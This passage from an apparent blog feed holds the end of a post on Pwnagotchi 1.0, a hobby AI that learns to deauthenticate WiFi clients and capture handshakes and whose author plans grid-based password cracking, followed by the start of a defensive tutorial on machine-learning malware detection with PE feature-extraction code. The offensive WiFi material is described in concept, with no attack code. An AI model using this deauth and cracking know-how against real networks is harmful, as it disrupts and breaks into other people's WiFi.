<li>An histogram of the number of client stations, per channel - so that the AI knows which channels are best for deauthentication attacks.</li>
<li>An histogram of the number of other Pwnagotchis, per channel - so that the AI can learn to cooperate with others by going on less crowded channels.</li>
</ol>
<p>However, Pwnagotchi’s has something that makes it very different from any of the use cases and algorithms described in the book. You can usually fast forward, rewind and replay videogame levels. Even during simpler supervised learning, you have all at once the entire temporal snapshot of data that your system needs to learn, being it <a href="/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/">a malware dataset</a>, or a Super Mario level. All the algorithms described in that book and implemented in the most popular software libaries, assume you to have an artificial, replayable and predictable environment to train the algorithm in.</p>
<p>Pwnagotchi needed to learn continuously by observing the real world, that is unpredictable and potentially different every time, at a real world time scale, that is, how long a single ARM CPU core can take to scan the entire WiFi spectrum and interact with its findings - from seconds to several minutes. And this can’t be replayed, as different policies lead to different observations which lead to different future policies … solving this has been challenging to say the least, as there’s no previous code example or use case or explaination on how to integrate with any of those algorithms the way I needed.</p>
<p><img src="https://lh3.googleusercontent.com/b8b94u5L4giM3L_67g70Bju8n6upLnXEzMYqTFDTMw5_Stv2cfooUXg8v2fpqMM4GCUm3bfOq5DBc4Llywzhg8m3gFj7i5Zg0B-E35bz1b_ah5SnJ5R0Nr1yVBvKqcNq6PUumAI04wFe9fBvVddFivT-_vcC3h0TtD4G9kR9qylVh3kaxzwWejGCsKq3zACQnHjxFi5NWhw4kcf0bBwETWrCrozk6rxVGbsYaBNYyQ5BCbkJ0ZBCUDJig7gnDmaeCb2oeeEm4a-0a7Dp1pI05DJlHPlRsrzbcZxjYUIkVJyF-VbGsujd12O2veroP2DU-Pnp0lshl7cMASovx0etXLxrQj9u9rm2lb1LwdzD5nTyXm9Xo4GdKj5B1wq8kE1gYSqfszXjvELLQmtA-Hu0TnAZBR_KVHa6-ToCYS_7r90N1kaqHRVshz0X942clVGUHOihmw-_QQ9BSc3cLmYlcJs95DnN18hjG1XVhxG-tqCKL7ujkGPh2_Drs64exjPrT8EGa1YnRJPm2_YqC5DGVKiNk7cP74YijL8o732H8ljzTkk-AU6fzTAAnP3s8mWlkSMEZ28t2YdXGwyszs_FxEI4koD8a7Tq2U1aSnmA-nTuSPHIq70-JDWAuzKN4W9Dkil1vT2uGRJkUcntJQDzfV7GThZDCCtIqI8AKeBKDn7MpADGMw=w2128-h1596-no" alt="more study"></p>
<p>After a couple more weeks of studying and digging into the various implementations, I came up with <a href="https://github.com/evilsocket/pwnagotchi/blob/master/pwnagotchi/ai/gym.py" target="_blank" rel="noopener">a pretty decent solution</a> that worked, surprisingly, out of the box. The continuous reinforcement learning logic works like this (keep in mind: one epoch is one loop of the main algorithm, from a few seconds to a few minutes depending on the WiFi things around you):</p>
<ol>
<li>At each epoch, depending on a <a href="https://github.com/evilsocket/pwnagotchi/blob/master/pwnagotchi/defaults.yml#L97" target="_blank" rel="noopener">laziness factor</a>, decide if using the next epoch for training or not.</li>
<li>If not, just use the current AI to estimate a set of optimal parameters and repeat from 1.</li>
<li>If we’re in training mode, this and the next <a href="https://github.com/evilsocket/pwnagotchi/blob/master/pwnagotchi/defaults.yml#L99" target="_blank" rel="noopener">50 epochs</a> will be used as … a Super Mario episode! :D</li>
</ol>
<p>So that depending on how “lazy” the AI is configured to be, it will be learning most of the times or just conservately predicting parameters and only learn from new environments once in a while. Ideally: you want the laziness to be very low for younger units, so that they’ll learn fast, and then keep increasing their laziness over time, when they become more mature and present useful behaviours you want to keep and not accidentally “unlearn”. </p>
<p>Does it work? Yes it does, after a few days (or weeks, if you live in a isolated area), you literally start seeing the units going on different channels when they see each other, adjusting only to the channels where they “see” potential reward, setting the timeouts correctly depending on how fast the unit is moving in space and therefore how fast it needs to “lock on” new targets. Feel free to try and read what happens in <code>/var/log/pwnagotchi.log</code> :D</p>
<p><img src="https://lh3.googleusercontent.com/xzE_g_-oOAfU2fL3RmeHdkJ0TPpDpdRgxnC5NrqmdAiT8TaRvBIzhpuRdsLxBrgAbjGB9iBsR3tXJLBwV4zFloVkXboq4MVEe8egOKxffh9NAsIStJriO6QhMDwFFq86fP5Yg4azKKGeGgFF6hsAhk8Y36GLzgL8vYGw9bikRJI9eyqoX1v9Umg5NLPsJAX86WpPzWXZcO-NAnLdjF-yE-DIIV2c3pEpM_C0_3TfpQN7qlX0J5AnZCQ8BkhX9KO0KaRn9D4cTlOKkV1V8hdw5k1rjP3pN2vc-yBHiFU9TeJkK0IZCobK86fswJT_lrq3m6HEnSLJqH7r_fNJh_pHOp9syv3D-Ipn1EnzkiYx8BSuz9ILtBbnoi-S1fFP9R0Lpb0RPNBUJKfuXfnRNjG6UNT9BJV9lBt-rPBEZjMymRsUSuuooktLJu4XIE1U0Xo4oaz6JtC6mE7DdeRMCqVw3Z39EsQKu2hVwZ4IluZlxgjjvwJYD-weEsjWz27D-gPuntQKw0VysZQ4aGDmo3gz1q82dV3fgBUNwepe_r7EloBiI8rOyfvaErfM2ISXFtaoJR9cJPF-pA3MPuUmpY3Od9KsDnQ_gROuwoT5Cz2dYs-F39WaT4HmpefKOGyComIhTp1WfPQWHd4Nt9dlEmUWX0IC14WHBNBWC4pxX4cgbss9IpGDLQ=w2128-h1596-no" alt="the gang"></p>
<h2 id="The-Community"><a href="#The-Community" class="headerlink" title="The Community"></a>The Community</h2><p>By this time, when the AI was implemented and working, I was back home in Italy and to be entirely honest I started being a bit bored with the project, mostly for a few technical difficulties I had that made me waste a huge amount of time on relatively trivial operational and implementation details:</p>
<ul>
<li>I started this project on Kali Linux because it already had nexmon, but turns out they don’t compile with hardware support for floating point operations, so I couldn’t do any AI there, and I had to start from scratch with Raspbian.</li>
<li>This is a single ARM core, at 1Ghz: the unit took ~10 minutes to import TensorFlow alone, a total of ~30 minutes to bootstrap all python dependencies (the inference and learning run pretty fast once the dependencies are loaded tho). Testing, debugging and developing new features was <strong>slow</strong>.</li>
<li>I still didn’t have any idea how to build an .img file. So far I only worked on my own unit and took a .img of the entire SD card as a backup.</li>
</ul>
<p>And let’s be even more honest: all the “cooler” problems, the challenges, were solved already: the AI was slow as f to load, but it worked pretty great once started … everything else started feeling a bit boring and so I paused the project. However, <a href="https://twitter.com/pwnagotchi" target="_blank" rel="noopener">I hyped the sh*t out of it on Twitter</a>, mostly because it’s fun to share updates with followers and friends, and I didn’t want to disappoint them, so I published the super-buggy-crap-version-alpha on GitHub.</p>
<p>That turned out to be absolutely the best thing to do, as the help and feedback I’ve got from the community starting from day 0 has been impressive: from <a href="https://twitter.com/syshero" target="_blank" rel="noopener">this man, that now is my personal hero</a> setting up the <a href="https://github.com/evilsocket/pwnagotchi/tree/master/builder" target="_blank" rel="noopener">completely automated build system</a> of the .img files, to <a href="https://twitter.com/0x9ABC" target="_blank" rel="noopener">this awesome guy</a> that implemented the <a href="https://github.com/evilsocket/pwnagotchi/blob/master/pwnagotchi/plugins/default/bt-tether.py" target="_blank" rel="noopener">Bluetooth plugin</a> for easy connectivity with a smartphone (among other things), to <a href="http://twitter.com/elkentaro" target="_blank" rel="noopener">elkentaro</a> that sent me the first 3D printed case, motivating me more than he’ll ever imagine, to <a href="https://twitter.com/hexwaxwing" target="_blank" rel="noopener">Hex</a>, that from the very beginning gave me some of the best ideas and encouraged me on that porch, she curated the documentation and bootstrapped the community itself, to <a href="https://github.com/evilsocket/pwnagotchi/graphs/contributors" target="_blank" rel="noopener">all the people</a> that translated the project in so many different languages, submitted a fix, a new feature or just some ideas.</p>
<p>This gave me some time to decompress and work on other, new ideas that evolved the project again (see “The Crypto” section) and gave new life to it (mostly to me). Today we have <a href="https://pwnagotchi.herokuapp.com/" target="_blank" rel="noopener">a Slack channel</a> that’s quickly approaching its first 1000 of users, a <a href="https://www.reddit.com/r/pwnagotchi/" target="_blank" rel="noopener">subreddit</a> made by the community, <a href="http://pwnagotchi.ai" target="_blank" rel="noopener">clear documentation</a>, a <a href="https://github.com/evilsocket/pwnagotchi" target="_blank" rel="noopener">very active repository</a>, <a href="https://hackaday.com/2019/10/16/a-tamagotchi-for-wifi-cracking/" target="_blank" rel="noopener">HackADay talked about us</a>, but most importantly, even before arriving to the first 1.0.0 release, hundreds of units registered already from all over the world.</p>
<center><br>    <iframe src="https://pwnagotchi.ai/map/" width="765px" height="600px" frameborder="0" allow="autoplay; fullscreen" allowfullscreen></iframe><br></center>

<p>It is thanks to these people, their efforts and their support that today we are ready to release the 1.0.0 of the project - <strong>guys we made it, you are AWESOME!!!</strong>.</p>
<h2 id="The-Crypto"><a href="#The-Crypto" class="headerlink" title="The Crypto"></a>The Crypto</h2><p>While developing the <a href="https://pwnagotchi.ai/api/grid/" target="_blank" rel="noopener">grid API</a> running on pwnagotchi.ai used to keep track of the <a href="https://pwnagotchi.ai/configuration/#set-your-pwngrid-preferences" target="_blank" rel="noopener">registered units</a>, I had to decide some sort of authentication mechanism that wasn’t the usual username and password - I wanted people to authenticate to the API just by having a Pwnagotchi. So I started playing with RSA, and generated a keypair on each of the units at their first boot.</p>
<p>The idea that those keys were only used to authenticate to the API bothered me: there’s so much that can be done with RSA keys on dedicated hardware … this is how <a href="https://pwnagotchi.ai/usage/#pwnmail" target="_blank" rel="noopener">PwnMAIL</a> started. Each Pwnagotchi is also an end-to-end encrypted messaging device. Users can send messages to each other, messages that are encrypted on their hardware and stored on our servers, so that can only be decrypted by the recipient unit. The keys are generated and phisically isolated on cheap and disposable hardware (that also happens to run a super cute hacker AI ^_^). It’s easy to secure them by creating a <a href="https://github.com/NicoHood/NicoHood.github.io/wiki/Raspberry-Pi-Encrypt-Root-Partition-Tutorial" target="_blank" rel="noopener">LUKS encrypted partition</a> so that they can’t be recovered from the SD card.</p>
<p><img src="https://lh3.googleusercontent.com/sBAr9WnFHXuz_NPc99zNxKutL6Yotkei7__WFKjDhzrsuJr8pQs-jvlcRVRJymWSHvMFWc7ly5IxkjkyZOiv4M9cNbVt9ySMzFSjH6IQrYnnFafc8uMzcUdl6Pbhx7UhpO_EGQuworM4nItFYvpHkXOe3kl2oUYUC7I7NBiJfy1HbfdEsV_r5gmEQE7BDSXUfaigCbTa3Cg2wUllNulN7atylHDcz79EJtDh4NsWqnOFXphBSDU99RdKspdX44fKKA2jNjJu7mrkG-Wfwnp51Iiz5Egi1umH1si3DiMKofJmdBGhHwSr0ZHWH7bSwWbQ5oAt901zn_Ja3wcLckOeKcPEVKmsbm-bI4ooBu7JoIbACVeTSjUxFOcw8MfpbRuxoRNobOo3SIN-jK1zSslF_0MhO2lPVDbPlIzHBroGUYQf2xw_CtXsauE0VzjU3vb6ZZN2hWGxeXfMJNoooM1gWM9fjHyiMc5zlNv-_M9piBvaV4aW2w7DfI8JBIyRfnfieB0gKXCGMkN5tXMToCtiyg1MqqWd6ujZ2Ko5ODsawjRe2CxKBktDlCPYV-jBdUfPgqBF_pzJyMh6EWWArE5-oA4zmjSamr0WM73sPfn0H1BiIS313-YqB8zqR3Rq3KqBE9LMsunBscpukTm2xpS_4Nr3ZvfuQc2aaaFRs0W58Rs8DMQF5w=w954-h268-no" alt="pwnmail"></p>
<p>It’s easier than GPG, hardware isolated and it’s not connected to a phone number. You can use it to send encrypted text messages or small files.</p>
<h2 id="The-Future"><a href="#The-Future" class="headerlink" title="The Future"></a>The Future</h2><p>Let’s talk about AI olympics! :D</p>
<p>Since the grid API is pretty open and users with valid RSA keys could send any amount of “pwned networks”, I decided <strong>not</strong> to use the data they send from any sort of scoreboard, ranking or competition system. This would only push some malicious (and very boring) users to cheat by sending fake statistics of fake units, therefore ruining the fun for all the others.</p>
<p>Each unit currently has a <code>/root/brain.nn</code> file which stores its neural networks and it’s just a few MB: <strong>this</strong> is what the users will be uploading when competitive features will be implemented (and they will be) server side.</p>
<p>Each AI will be executed in a virtual environment, built on top of <a href="https://www.bettercap.org/modules/core/api.rest/#api-rest-record-filename" target="_blank" rel="noopener">bettercap’s sessions recorded from real world scenarios</a> and wrapped in such a way that it won’t be able to tell the difference from its normal, real world WiFi routine. While this system can not be used for training, because the way those scenarios will react is artificial (I will script who will send an handshake to whom depending on the right or wrong decisions the AI made), it can be used to <strong>benchmark</strong> how that specific brain.nn file peforms in terms of average reward per session. This is a value that increases over time, the more (and the better) the AI is trained, and can’t be faked. This is what the <strong>PwnOlympics</strong> will be built on. Good luck cheating with that :D</p>
<p>Now let’s talk about distributed computing … </p>
<p>A modern GPU used in a cracking rig is so effective because is powered, differently from a CPU, by thousands of cores, a bit more than 1Ghz each, that are used to parallelize the search algorithms required for cracking … but it’s expensive. </p>
<p><strong>If and when</strong> the project will reach the thousands of units, PwnGRID will provide a similar amount of “cores”, that can be orchestrated as a single computational unit, to everybody, for free. Whatever cracking power the grid will reach, it’ll be distributed according to the previous contributions of who submitted the job: the more CPU cycles you’ll give to the grid, the higher the priority (and number of units) you will have to perform your operation. It’s like a BlockChain (proof of pwn!) mixed with Emule’s logic of giving priority to nodes that contributed more.</p>
<p>These are just some of the ideas that we are discussing and implementing, we need more and we need higher numbers. You’re more than welcome to join our Slack channel and help :)</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>A few key points I didn’t want to omit but that I don’t feel like phrasing more extensively than this:</p>
<ul>
<li>AI can be easy and fun, don’t let academic papers scare you with complex terminology, learn.</li>
<li>Walk more, now you have another excuse.</li>
<li>ESP based deauthers, to name one, always existed. Don’t yell at us “OMG they’re deauthing all over the city!!!”. Despite this stuff always existing, nobody bothered updating <a href="https://en.wikipedia.org/wiki/IEEE_802.11w-2009" target="_blank" rel="noopener">to technologies that work better and are more secure</a>. <strong>That</strong> is the people you should be yelling at.</li>
<li><strong>If you work at Twitter and you’re reading this:</strong> please, I’ve tried to verify <a href="https://twitter.com/pwnagotchi" target="_blank" rel="noopener">@pwnagotchi</a> email in order to get a developer token and tweet from my unit, I never got the confirmation email, can you help? Thanks.</li>
</ul>
<hr>
<p><a href="https://twitter.com/pwnagotchi?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false" target="_blank" rel="noopener">Follow @pwnagotchi</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This is the story of a summer project that started out of boredom and that evolved into something incredibly fun and unique. It is also the story of how that project went from being discussed on a porch by just two people, to having &lt;a href=&quot;https://pwnagotchi.herokuapp.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;a community made of almost 700 awesome people&lt;/a&gt; (and counting!) that gathered, polished it and made today’s release possible.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR: You can &lt;a href=&quot;https://github.com/evilsocket/pwnagotchi/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;download the 1.0.0 .img file from here&lt;/a&gt;, then just &lt;a href=&quot;https://pwnagotchi.ai/installation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;follow the instructions&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you want the long version instead, sit back, relax and enjoy the ride. Let me me tell you: it’s going to be quite a long journey compared to my usual blog posts, but it’ll be worth it (i hope) and fun (i hope even harder).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/rU0zZOZxcLLJsH2hBm_kCXzI_eR6V2xvNs4nco34IaQmJe1N8UJavdCuI9JcVBzDaWBRmj1dkPQBP2GupwWOy4YdqTMjJYewQSw8qj1A2o-CJktT3cmy2iRzNqxhUQ0Ip9RB_nXiIEGAwReQeY9nSNQtndjXNhKvckahBalJ9zt3g_rGt8SI3jJpuXvjkBHhA-rbXvSQHQu5ZmRBcj93Lb9EcSvMJe5WELwZGcvELXXiPvhSMx1kRQkYL077cs_KrRXKwDRXbzFhaNYZ5V1BA8VOFj-79EwMznpAo_CztOcTWHNMKSgEjEyr3ugIFVVmPE5L5cuHNQ1-jxzdb8hsojb5ELmJOVXj00sBIebpRqFQaAovLmrDYU8IbAHH8vqDrCR2sKdNx3Rue6ZCfD5GSVHbLovrlKMj717jkxTaWcETFFKSAXiNzcm-95atwOLgfHW2cPq1hMmVwKnzwaldn3DCMnK47p34zvJBddx6jZnVFMrE6Zm4WSJ3Qiw3l9PjM9QiXFvOjIZjBUG3i58Lthffu5nBGmz62TPPEJ0zu4Bw5CiLziSbzAF9kqglMfaXRE1B8PnGD_2yw8JaJUjIizZOJs25YOmyaWxOKxugE_PbZvnm35N-6KBygoPtul8onAXuJeMee4A9akynZNzMvXpp6HM_IA6xv0LmmpfSBJ7XVmK6gQ=w2670-h1312-no&quot; alt=&quot;hack the planet&quot;&gt;&lt;/p&gt;
&lt;p&gt;Let’s begin …&lt;/p&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="wifi" scheme="https://www.evilsocket.net/tags/wifi/"/>
    
      <category term="deep learning" scheme="https://www.evilsocket.net/tags/deep-learning/"/>
    
      <category term="dnn" scheme="https://www.evilsocket.net/tags/dnn/"/>
    
      <category term="machine learning" scheme="https://www.evilsocket.net/tags/machine-learning/"/>
    
      <category term="neural networks" scheme="https://www.evilsocket.net/tags/neural-networks/"/>
    
      <category term="ai" scheme="https://www.evilsocket.net/tags/ai/"/>
    
      <category term="deep neural networks" scheme="https://www.evilsocket.net/tags/deep-neural-networks/"/>
    
      <category term="cuda" scheme="https://www.evilsocket.net/tags/cuda/"/>
    
      <category term="nvidia" scheme="https://www.evilsocket.net/tags/nvidia/"/>
    
      <category term="artificial intelligence" scheme="https://www.evilsocket.net/tags/artificial-intelligence/"/>
    
      <category term="pwnagotchi" scheme="https://www.evilsocket.net/tags/pwnagotchi/"/>
    
      <category term="deep reinforcement learning" scheme="https://www.evilsocket.net/tags/deep-reinforcement-learning/"/>
    
      <category term="reinforcement learning" scheme="https://www.evilsocket.net/tags/reinforcement-learning/"/>
    
      <category term="handshakes" scheme="https://www.evilsocket.net/tags/handshakes/"/>
    
  </entry>
  
  <entry>
    <title>How to Create a Malware Detection System With Machine Learning</title>
    <link href="https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/"/>
    <id>https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/</id>
    <published>2019-05-22T21:59:13.000Z</published>
    <updated>2019-10-19T08:14:27.107Z</updated>
    
    <content type="html"><![CDATA[<p>In this post we’ll talk about two topics I love and that have been central elements of my (private) research for the last ~7 years: machine learning and malware detection.</p>
<p>Having a rather empirical and definitely non-academic education, I know the struggle of a passionate developer who wants to approach machine learning and is trying to make sense of formal definitions, linear algebra and whatnot. Therefore, I’ll try to keep this as practical as possible in order to allow even the less <em>formally-educated</em> reader to understand and possibly start having fun with neural networks. </p>
<p>Moreover, most of the resources out there focus on very known problems such as handwritten digit recognition on the <a href="https://en.wikipedia.org/wiki/MNIST_database" target="_blank" rel="noopener">MNIST dataset</a> (the “hello world” of machine learning), while leaving to the reader’s imagination how more complex features engineering systems are supposed to work and generally what to do with inputs that are not images.</p>
<p>TL;DR: <em>I’m bad at math, MNIST is boring and detecting malware is more fun :D</em></p>
<p>I’ll also use this as an example use-case for some new features of <a href="https://github.com/evilsocket/ergo" target="_blank" rel="noopener">ergo</a>, a project me and <a href="https://twitter.com/chiconara" target="_blank" rel="noopener">chiconara</a> started some time ago to automate machine learning models creation, data encoding, training on GPU, benchmarking and deployment at scale.</p>
<p>The source code related to this post is available <a href="https://github.com/evilsocket/ergo-pe-av" target="_blank" rel="noopener">here</a>.</p>
<p><strong>Important note: this project alone does NOT constitute a valid replacement for your commercial antivirus.</strong></p>
<center><br><img src="https://i.imgur.com/cBCBdlH.png"><br></center>

<h3 id="Problem-Definition-and-Dataset"><a href="#Problem-Definition-and-Dataset" class="headerlink" title="Problem Definition and Dataset"></a>Problem Definition and Dataset</h3><center><br><img src="https://i.imgur.com/2JphgOS.jpg"><br></center>

<p>Traditional malware detection engines rely on the use of signatures - unique values that have been manually selected by a malware researcher to identify the presence of malicious code while making sure there are no collisions in the non-malicious samples group (that’d be called a <em>“false positive”</em>).</p>
<p>The problems with this approach are several, among others it’s usually easy to bypass (depending on the type of signature, the change of a single bit or just a few bytes in the malicious code could make the malware undetectable) and it doesn’t scale very well when the number of researchers is orders of magnitude smaller than the number of unique malware families they need to manually reverse engineer, identify and write signatures for.</p>
<p>Our goal is teaching a computer, more specifically an artificial neural network, to detect Windows malware without relying on any explicit signatures database that we’d need to create, but by simply ingesting the dataset of malicious files we want to be able to detect and learning from it to distinguish between malicious code or not, both inside the dataset itself but, most importantly, while processing new, unseen samples. Our only knowledge is which of those files are malicious and which are not, but not what specifically makes them so, we’ll let the ANN do the rest.</p>
<p>In order to do this, I’ve collected approximately 200,000 <a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="noopener">Windows PE</a> samples, divided evenly in malicious (<em>with 10+ detections on VirusTotal</em>) and clean (<em>known and with 0 detections on VirusTotal</em>). Since training and testing the model on the very same dataset wouldn’t make much sense (as it could perform extremely well on the training set, but not being able to generalize at all on new samples), this dataset will be automatically divided by ergo into 3 sub sets:</p>
<ul>
<li>A <em>training set</em>, with 70% of the samples, used for training.</li>
<li>A <em>validation set</em>, with 15% of the samples, used to benchmark the model at each training epoch.</li>
<li>A <em>test set</em>, with 15% of the samples, used to benchmark the model after training.</li>
</ul>
<p>Needless to say, the amount of (correctly labeled) samples in your dataset is key for the model accuracy, its ability to correcly separate the two classes and generalize to unseen samples - the more you’ll use in your training process, the better. Besides, ideally the dataset should be periodically updated with newer samples and the model retrained in order to keep its accuracy high over time even when new unique samples appear in the wild (namely: wget + crontab + ergo).</p>
<p>Due to the size of the specific dataset I’ve used for this post, I can’t share it without killing my bandwidth:</p>
<center><br><img src="https://i.imgur.com/kEsLLOP.jpg"><br></center>

<p>However, <a href="https://drive.google.com/file/d/1HIJShr0GvQCUp_0R_kQe_WLG5PippurN/view?usp=sharing" target="_blank" rel="noopener">I uploaded the dataset.csv file on Google Drive</a>, it’s ~340MB extracted and you can use it to reproduce the results of this post.</p>
<h3 id="The-Portable-Executable-format"><a href="#The-Portable-Executable-format" class="headerlink" title="The Portable Executable format"></a>The Portable Executable format</h3><p>The Windows PE format is <a href="https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format" target="_blank" rel="noopener">abundantly documented</a> and many good resources to understand the internals, such as <a href="https://twitter.com/angealbertini" target="_blank" rel="noopener">Ange Albertini</a>‘s <em>“<a href="https://www.slideshare.net/ange4771/44con2013-workshop-exploring-the-portable-executable-format" target="_blank" rel="noopener">Exploring the Portable Executable format</a>“</em> 44CON 2013 presentation (from where I took the following picture) are available online for free, therefore I won’t spend too much time going into details.</p>
<p>The key facts we must keep in mind are:</p>
<ul>
<li>A PE has several headers describing its properties and various addressing details, such as the base address the PE is going to be loaded in memory and where the entry point is.</li>
<li>A PE has several sections, each one containing data (constants, global variables, etc), code (in which case the section is marked as executable) or sometimes both.</li>
<li>A PE contains a declaration of what API are imported and from what system libraries. </li>
</ul>
<center><br><img src="https://i.imgur.com/olmDveV.png" width="100%"><br><small><a href="https://www.slideshare.net/ange4771/44con2013-workshop-exploring-the-portable-executable-format" target="blank">Credits to Ange Albertini</a></small><br></center>

<p>For instance, this is how the Firefox PE sections look like:</p>
<center><br><img src="https://i.imgur.com/Ht745tL.png" width="100%"><br><small><a href="https://bsodtutorials.wordpress.com/2014/11/14/upx-packing-and-anti-packing-techniques/" target="blank">Credits to the “Machines Can Think” blog</a></small><br></center>

<p>While in some cases, if the PE has been processed with a <a href="https://upx.github.io/" target="_blank" rel="noopener">packer such as UPX</a>, its sections might look a bit different, as the main code and data sections are compressed and a code stub to decompress at runtime it’s added:</p>
<center><br><img src="https://i.imgur.com/JDAdMux.png" width="100%"><br><small><a href="https://bsodtutorials.wordpress.com/2014/11/14/upx-packing-and-anti-packing-techniques/" target="blank">Credits to the “Machines Can Think” blog</a></small><br></center>

<p>What we’re going to do now is looking at how we can encode these values that are very heterogeneous in nature (they’re numbers of all types of intervals and strings of variable length) into a vector of scalar numbers, each normalized in the interval [0.0,1.0], and of constant length. This is the type of input that our machine learning model is able to understand. </p>
<p>The process of determining which features of the PE to consider is possibly the most important part of designing any machine learning system and it’s called <em>features engineering</em>, while the act of reading these values and encoding them is called <em>features extraction</em>.</p>
<h3 id="Features-Engineering"><a href="#Features-Engineering" class="headerlink" title="Features Engineering"></a>Features Engineering</h3><p>After creating the project with:</p>
<pre><code>ergo create ergo-pe-av
</code></pre><p>I started implementing the features extraction algorithm, inside the <a href="https://github.com/evilsocket/ergo-pe-av/blob/master/encoder.py#L122" target="_blank" rel="noopener">encode.py file</a>, as a very simple (150 lines including comments and multi line strings) starting point that yet provides us enough information to reach interesting accuracy levels and that could easily be extended in the future with additional features.</p>
<pre><code>cd ergo-pe-av
vim encode.py
</code></pre><p>The first 11 scalars of our vector encode a set of boolean properties that <a href="http://lief.quarkslab.com/" target="_blank" rel="noopener">LIEF</a>, the amazing library from QuarksLab I’m using, parses from the PE - each property is encoded to a <code>1.0</code> if true, or to a <code>0.0</code> if false:</p>
<table>
<thead>
<tr>
<th>Property</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pe.has_configuration</code></td>
<td>True if the PE has a <a href="https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#the-load-configuration-structure-image-only" target="_blank" rel="noopener">Load Configuration</a></td>
</tr>
<tr>
<td><code>pe.has_debug</code></td>
<td>True if the PE has a Debug section.</td>
</tr>
<tr>
<td><code>pe.has_exceptions</code></td>
<td>True if the PE is using exceptions.</td>
</tr>
<tr>
<td><code>pe.has_exports</code></td>
<td>True if the PE has any exported symbol.</td>
</tr>
<tr>
<td><code>pe.has_imports</code></td>
<td>True if the PE is importing any symbol.</td>
</tr>
<tr>
<td><code>pe.has_nx</code></td>
<td>True if the PE has the <a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="noopener">NX bit</a> set.</td>
</tr>
<tr>
<td><code>pe.has_relocations</code></td>
<td>True if the PE has relocation entries.</td>
</tr>
<tr>
<td><code>pe.has_resources</code></td>
<td>True if the PE has any resource.</td>
</tr>
<tr>
<td><code>pe.has_rich_header</code></td>
<td>True if a rich header is present.</td>
</tr>
<tr>
<td><code>pe.has_signature</code></td>
<td>True if the PE is digitally signed.</td>
</tr>
<tr>
<td><code>pe.has_tls</code></td>
<td>True if the PE is using <a href="https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#the-tls-section" target="_blank" rel="noopener">TLS</a></td>
</tr>
</tbody>
</table>
<p>Then 64 elements follow, representing the first 64 bytes of the PE entry point function, each normalized to <code>[0.0,1.0]</code> by dividing each of them by <code>255</code> - this will help the model detecting those executables that have very distinctive entrypoints that only vary slightly among different samples of the same family (you can think about this as a very basic signature):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ep_bytes  =  [<span class="number">0</span>]  *  <span class="number">64</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	ep_offset = pe.entrypoint - pe.optional_header.imagebase</span><br><span class="line">	ep_bytes = [int(b) <span class="keyword">for</span> b <span class="keyword">in</span> raw[ep_offset:ep_offset+<span class="number">64</span>]]</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	log.warning(<span class="string">"can't get entrypoint bytes from %s: %s"</span>, filepath, e)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_entrypoint</span><span class="params">(ep)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> len(ep) &lt; <span class="number">64</span>: <span class="comment"># pad</span></span><br><span class="line">		ep += [<span class="number">0.0</span>]</span><br><span class="line">	<span class="keyword">return</span> np.array(ep) / <span class="number">255.0</span> <span class="comment"># normalize</span></span><br></pre></td></tr></table></figure>
<p>Then an histogram of the repetitions of each byte of the ASCII table (therefore size 256) in the binary file follows - this data point will encode basic statistical information about the raw contents of the file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the 'raw' argument holds the entire contents of the file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_histogram</span><span class="params">(raw)</span>:</span></span><br><span class="line">	histo = np.bincount(np.frombuffer(raw, dtype=np.uint8), minlength=<span class="number">256</span>)</span><br><span class="line">	histo = histo / histo.sum() <span class="comment"># normalize</span></span><br><span class="line">	<span class="keyword">return</span>  histo</span><br></pre></td></tr></table></figure>
<p>The next thing I decided to encode in the features vector is the import table, as the API being used by the PE is quite a relevant information :D In order to do this <a href="https://github.com/evilsocket/ergo-pe-av/blob/master/encoder.py#L22" target="_blank" rel="noopener">I manually selected the 150 most common libraries</a> in my dataset and for each API being used by the PE I increment by one the column of the relative library, creating another histogram of 150 values then normalized by the total amount of API being imported:</p>
